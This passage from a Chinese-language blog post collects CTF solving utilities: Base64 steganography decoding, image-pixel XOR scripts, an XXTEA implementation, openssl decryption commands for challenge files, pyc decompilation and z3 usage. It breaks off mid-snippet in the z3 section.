<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>脚本工具 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="首先我个脚本小子不可能写得出来，都是抄的和chatgpt大哥写的，（ε&#x3D;(´ο｀*)))唉，看不见的大手发力了！！！！！！！ 为了避嫌我把原地找到了，不要来抓我，退一万步讲，，，，，哎！？你也听不到 有时候一个知道的知识点却不记得解题脚本放哪个wp里了，又懒得再写一遍。那就专门开个地方存起来。分类就不分了，有些脚本多个分区都能用。 Base64隐写来源 12345678910111213">
<meta property="og:type" content="article">
<meta property="og:title" content="脚本工具">
<meta property="og:url" content="https://theganlove.github.io/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="首先我个脚本小子不可能写得出来，都是抄的和chatgpt大哥写的，（ε&#x3D;(´ο｀*)))唉，看不见的大手发力了！！！！！！！ 为了避嫌我把原地找到了，不要来抓我，退一万步讲，，，，，哎！？你也听不到 有时候一个知道的知识点却不记得解题脚本放哪个wp里了，又懒得再写一遍。那就专门开个地方存起来。分类就不分了，有些脚本多个分区都能用。 Base64隐写来源 12345678910111213">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-09-01T13:39:36.000Z">
<meta property="article:modified_time" content="2024-09-01T13:44:50.332Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://theganlove.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-脚本工具" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/" class="article-date">
  <time class="dt-published" datetime="2024-09-01T13:39:36.000Z" itemprop="datePublished">2024-09-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      脚本工具
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>首先我个脚本小子不可能写得出来，都是抄的和chatgpt大哥写的，（ε&#x3D;(´ο｀*)))唉，看不见的大手发力了！！！！！！！</p>
<p>为了避嫌我把原地找到了，不要来抓我，退一万步讲，，，，，哎！？你也听不到</p>
<p>有时候一个知道的知识点却不记得解题脚本放哪个wp里了，又懒得再写一遍。那就专门开个地方存起来。分类就不分了，有些脚本多个分区都能用。</p>
<h2 id="Base64隐写"><a href="#Base64隐写" class="headerlink" title="Base64隐写"></a>Base64隐写</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/349481870">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Base64Stego_Decrypt</span>(<span class="params">LineList</span>):</span><br><span class="line">    Base64Char = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>     <span class="comment">#Base64字符集 已按照规范排列</span></span><br><span class="line">    BinaryText = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> LineList:</span><br><span class="line">        <span class="keyword">if</span> line.find(<span class="string">&quot;==&quot;</span>) &gt; <span class="number">0</span>:     <span class="comment">#如果文本中有2个=符号</span></span><br><span class="line">            temp = <span class="built_in">bin</span>(Base64Char.find(line[-<span class="number">3</span>]) &amp; <span class="number">15</span>)[<span class="number">2</span>:]      <span class="comment">#通过按位与&amp;15运算取出二进制数后4位 [2:]的作用是将0b过滤掉</span></span><br><span class="line">            BinaryText = BinaryText+<span class="string">&quot;0&quot;</span>*(<span class="number">4</span>-<span class="built_in">len</span>(temp))+temp      <span class="comment">#高位补0</span></span><br><span class="line">        <span class="keyword">elif</span> line.find(<span class="string">&quot;=&quot;</span>) &gt; <span class="number">0</span>:        <span class="comment">#如果文本中有1个=符号</span></span><br><span class="line">            temp = <span class="built_in">bin</span>(Base64Char.find(line[-<span class="number">2</span>]) &amp; <span class="number">3</span>)[<span class="number">2</span>:]       <span class="comment">#通过按位与&amp;3运算取出二进制数后2位</span></span><br><span class="line">            BinaryText = BinaryText+<span class="string">&quot;0&quot;</span>*(<span class="number">2</span>-<span class="built_in">len</span>(temp))+temp      <span class="comment">#高位补0</span></span><br><span class="line">    Text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(BinaryText) % <span class="number">8</span> != <span class="number">0</span>):       <span class="comment">#最终得到的隐写数据二进制位数不一定都是8的倍数，为了避免数组越界，加上一个判断</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;警告:二进制文本位数有误，将进行不完整解析。&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(BinaryText), <span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span>(i+<span class="number">8</span> &gt; <span class="built_in">len</span>(BinaryText)):</span><br><span class="line">                Text = Text+<span class="string">&quot;-&quot;</span>+BinaryText[i:]</span><br><span class="line">                <span class="keyword">return</span> Text</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Text = Text+<span class="built_in">chr</span>(<span class="built_in">int</span>(BinaryText[i:i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(BinaryText), <span class="number">8</span>):</span><br><span class="line">            Text = Text+<span class="built_in">chr</span>(<span class="built_in">int</span>(BinaryText[i:i+<span class="number">8</span>], <span class="number">2</span>))      <span class="comment">#将得到的二进制数每8位一组对照ASCII码转化字符</span></span><br><span class="line">        <span class="keyword">return</span> Text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Base64_ForString_Decrypt</span>(<span class="params">Text</span>):     <span class="comment">#Base64解密</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        DecryptedText = <span class="built_in">str</span>(Text).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        DecryptedText = base64.b64decode(DecryptedText)</span><br><span class="line">        DecryptedText = DecryptedText.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> DecryptedText</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Course = <span class="built_in">input</span>(<span class="string">&quot;文件名:&quot;</span>)</span><br><span class="line">    File = <span class="built_in">open</span>(Course, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    LineList = File.read().splitlines()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;显式内容为:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> LineList:</span><br><span class="line">        <span class="built_in">print</span>(Base64_ForString_Decrypt(line),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n隐写内容为:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(Base64Stego_Decrypt(LineList))</span><br></pre></td></tr></table></figure>

<h2 id="Clemency"><a href="#Clemency" class="headerlink" title="Clemency"></a>Clemency</h2><p>Clemency是在DEFCON CTF中由LegitBS发明的架构（好家伙出个题直接创造了一个架构）。原生ida不支持此架构，下方链接提供了大佬的插件脚本。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/cseagle/ida_clemency">地址</a></p>
<h2 id="提取图片内像素"><a href="#提取图片内像素" class="headerlink" title="提取图片内像素"></a>提取图片内像素</h2><p>提取图片透明度值异或。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">m1 = m2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 取大图二进制</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.size[<span class="number">0</span>], <span class="number">19</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.size[<span class="number">1</span>], <span class="number">19</span>):</span><br><span class="line">        r,g,b,a = img.getpixel((x,y))</span><br><span class="line">        m1 += <span class="built_in">str</span>(r &amp; <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 取中间隐写图二进制</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">171</span>, <span class="number">171</span> + <span class="number">19</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">171</span>, <span class="number">171</span> + <span class="number">19</span>):</span><br><span class="line">        r,g,b,a = img.getpixel((x,y))</span><br><span class="line">        m2 += <span class="built_in">str</span>(a &amp; <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 二进制串取异或</span></span><br><span class="line">xor = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(<span class="built_in">int</span>(A)^<span class="built_in">int</span>(B)) <span class="keyword">for</span> A,B <span class="keyword">in</span> <span class="built_in">zip</span>(m1,m2))</span><br><span class="line"><span class="comment"># 二进制转字符串并输出</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(xor[i:i+<span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(xor), <span class="number">8</span>)))</span><br></pre></td></tr></table></figure>

<p>异或两张图片的完整rgb值，并用结果rgb值写另一张图片。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">image1 = Image.<span class="built_in">open</span>(<span class="string">&#x27;n1.png&#x27;</span>)</span><br><span class="line">image2 = Image.<span class="built_in">open</span>(<span class="string">&#x27;n2.png&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(image1.mode, image2.mode)</span><br><span class="line">size = width, height = image1.size</span><br><span class="line">new = Image.new(<span class="string">&#x27;RGBA&#x27;</span>, size)</span><br><span class="line">img1 = image1.load()</span><br><span class="line">img2 = image2.load()</span><br><span class="line">data = new.load()</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        one = img1[x,y]</span><br><span class="line">        two = img2[x,y]</span><br><span class="line">        new_color = (one[<span class="number">0</span>] ^ two[<span class="number">0</span>],one[<span class="number">1</span>] ^ two[<span class="number">1</span>],one[<span class="number">2</span>] ^ two[<span class="number">2</span>])</span><br><span class="line">        data[x,y]=new_color</span><br><span class="line">new.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>图片像素值(rgb)本身就是字节：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;ctf.png&quot;</span>)</span><br><span class="line">pixels = img.load()</span><br><span class="line">msg = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img.size[<span class="number">1</span>]):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.size[<span class="number">0</span>]):</span><br><span class="line">        msg += <span class="built_in">bytes</span>(pixels[x, y])</span><br><span class="line"><span class="built_in">print</span>(msg.decode())</span><br></pre></td></tr></table></figure>

<h2 id="词频统计"><a href="#词频统计" class="headerlink" title="词频统计"></a>词频统计</h2><p>统计单词出现的次数就比较麻烦，需要自己构建字典。比如这道题：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Konmu/p/12527029.html">浪里淘沙</a>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;ctf.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data=f.read()</span><br><span class="line">f.close()</span><br><span class="line">statistics=&#123;&#125;</span><br><span class="line">frequency=[]</span><br><span class="line">num=[<span class="number">4</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">16</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zipin</span>(<span class="params">lsit</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lsit:</span><br><span class="line">        statistics.setdefault(data.count(i),<span class="built_in">str</span>(i))</span><br><span class="line">        frequency.append(data.count(i))</span><br><span class="line">    frequency.sort()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(statistics.get(frequency[i-<span class="number">1</span>])),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span>(statistics)</span><br><span class="line"></span><br><span class="line">letters=[]</span><br><span class="line"><span class="built_in">print</span>(zipin(letters))</span><br></pre></td></tr></table></figure>

<h2 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h2><p>解密与加密脚本的python实现。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/DirWang/p/12198526.html">来源</a>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">_DELTA = <span class="number">0x9E3779B9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_long2str</span>(<span class="params">v, w</span>):</span><br><span class="line">    n = (<span class="built_in">len</span>(v) - <span class="number">1</span>) &lt;&lt; <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> w:</span><br><span class="line">        m = v[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> (m &lt; n - <span class="number">3</span>) <span class="keyword">or</span> (m &gt; n): <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        n = m</span><br><span class="line">    s = struct.pack(<span class="string">&#x27;&lt;%iL&#x27;</span> % <span class="built_in">len</span>(v), *v)</span><br><span class="line">    <span class="keyword">return</span> s[<span class="number">0</span>:n] <span class="keyword">if</span> w <span class="keyword">else</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_str2long</span>(<span class="params">s, w</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(s)</span><br><span class="line">    m = (<span class="number">4</span> - (n &amp; <span class="number">3</span>) &amp; <span class="number">3</span>) + n</span><br><span class="line">    s = s.ljust(m, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">    v = <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;%iL&#x27;</span> % (m &gt;&gt; <span class="number">2</span>), s))</span><br><span class="line">    <span class="keyword">if</span> w: v.append(n)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params"><span class="built_in">str</span>, key</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> == <span class="string">&#x27;&#x27;</span>: <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line">    v = _str2long(<span class="built_in">str</span>, <span class="literal">True</span>)</span><br><span class="line">    k = _str2long(key.ljust(<span class="number">16</span>, <span class="string">b&quot;\0&quot;</span>), <span class="literal">False</span>)</span><br><span class="line">    n = <span class="built_in">len</span>(v) - <span class="number">1</span></span><br><span class="line">    z = v[n]</span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    q = <span class="number">6</span> + <span class="number">52</span> // (n + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> q &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">sum</span> = (<span class="built_in">sum</span> + _DELTA) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        e = <span class="built_in">sum</span> &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span>  <span class="built_in">range</span>(n):</span><br><span class="line">            y = v[p + <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] + ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (<span class="built_in">sum</span> ^ y) + (k[p &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            z = v[p]</span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        v[n] = (v[n] + ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (<span class="built_in">sum</span> ^ y) + (k[n &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        z = v[n]</span><br><span class="line">        q -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> _long2str(v, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params"><span class="built_in">str</span>, key</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> == <span class="string">&#x27;&#x27;</span>: <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line">    v = _str2long(<span class="built_in">str</span>, <span class="literal">False</span>)</span><br><span class="line">    k = _str2long(key.ljust(<span class="number">16</span>, <span class="string">b&quot;\0&quot;</span>), <span class="literal">False</span>)</span><br><span class="line">    n = <span class="built_in">len</span>(v) - <span class="number">1</span></span><br><span class="line">    z = v[n]</span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    q = <span class="number">6</span> + <span class="number">52</span> // (n + <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">sum</span> = (q * _DELTA) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">sum</span> != <span class="number">0</span>):</span><br><span class="line">        e = <span class="built_in">sum</span> &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (<span class="built_in">sum</span> ^ y) + (k[p &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        z = v[n]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (<span class="built_in">sum</span> ^ y) + (k[<span class="number">0</span> &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">sum</span> = (<span class="built_in">sum</span> - _DELTA) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> _long2str(v, <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<h2 id="openssl解密"><a href="#openssl解密" class="headerlink" title="openssl解密"></a>openssl解密</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><ul>
<li>openssl rsautl -decrypt -inkey privatekey.key -in cipher.enc -out result</li>
</ul>
<h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><ul>
<li>openssl enc -d -aes-128-cbc -md md5 -pass pass:SevenPinLock0123456 -in flag.aes128cbc</li>
<li>openssl enc -aes-256-cbc -d -in flag.enc -out res -salt -iv xxx -K xxx</li>
</ul>
<h3 id="CSR文件"><a href="#CSR文件" class="headerlink" title="CSR文件"></a>CSR文件</h3><ul>
<li>openssl req -in file.csr -noout -text</li>
</ul>
<h2 id="openssl私钥格式"><a href="#openssl私钥格式" class="headerlink" title="openssl私钥格式"></a>openssl私钥格式</h2><p>头和尾分别需要包含这两行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<h2 id="批量openssl解密并合并图片"><a href="#批量openssl解密并合并图片" class="headerlink" title="批量openssl解密并合并图片"></a>批量openssl解密并合并图片</h2><p>例题：<a target="_blank" rel="noopener" href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/6%E7%BA%A7/Misc/Mysterious-GIF.md">Mysterious-GIF</a></p>
<h2 id="uncompyle6反编译pyc"><a href="#uncompyle6反编译pyc" class="headerlink" title="uncompyle6反编译pyc"></a>uncompyle6反编译pyc</h2><ul>
<li>uncompyle6 -o result.py ctf.pyc</li>
<li>uncompyle6的一个fork，可处理一些uncompyle6无法反编译的高版本pyc： <a target="_blank" rel="noopener" href="https://github.com/rocky/python-decompile3">https://github.com/rocky/python-decompile3</a></li>
</ul>
<h2 id="读取两个文件内容并xor"><a href="#读取两个文件内容并xor" class="headerlink" title="读取两个文件内容并xor"></a>读取两个文件内容并xor</h2><p>要求两个文件内容长度一致。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data1=f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;b.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data2=f.read()</span><br><span class="line"><span class="built_in">print</span>(strxor(data1.encode(),data2.encode()))</span><br></pre></td></tr></table></figure>

<h2 id="简单z3使用"><a href="#简单z3使用" class="headerlink" title="简单z3使用"></a>简单z3使用</h2><p>z3默认只会给出一个解，如果想要全部的解可以像下面这样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://stackoverflow.com/questions/13395391/z3-finding-all-satisfying-models</span></span><br><span class="line"><span class="keyword">while</span> s.check() == z3.sat:  </span><br><span class="line">    solution = <span class="string">&quot;False&quot;</span></span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        solution = <span class="string">f&quot;Or((<span class="subst">&#123;i&#125;</span> != <span class="subst">&#123;m[i]&#125;</span>), <span class="subst">&#123;solution&#125;</span>)&quot;</span></span><br><span class="line">    f2 = <span class="built_in">eval</span>(solution)</span><br><span class="line">    